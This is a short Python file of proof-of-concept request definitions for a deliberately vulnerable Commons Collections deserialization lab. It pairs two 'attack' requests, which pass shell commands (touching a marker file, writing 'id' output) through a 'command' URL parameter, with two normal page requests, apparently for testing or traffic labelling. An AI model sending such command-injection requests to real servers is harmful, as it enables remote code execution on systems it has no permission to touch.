# Auto-generated PoC definitions for Commons Collections playground.
import os

host = os.environ.get('HOST', '192.168.0.9')

requests_config = {
    'collections_attack_touch': {
        'method': 'GET',
        'url': 'http://{}:9945/transformer?command=touch%20/tmp/collections-success'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'Commons Collections 反序列化 touch 标记',
        'type': 'attack',
    },
    'collections_attack_output': {
        'method': 'GET',
        'url': 'http://{}:9945/transformer?command=id%20%3E%20/tmp/collections-output'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'Commons Collections 反序列化写入 id 输出',
        'type': 'attack',
    },
    'collections_normal': {
        'method': 'GET',
        'url': 'http://{}:9945/playground'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'Commons Collections 靶场首页',
        'type': 'normal',
    },
    'collections_status_normal': {
        'method': 'GET',
        'url': 'http://{}:9945/status'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'Commons Collections 执行状态',
        'type': 'normal',
    },
}
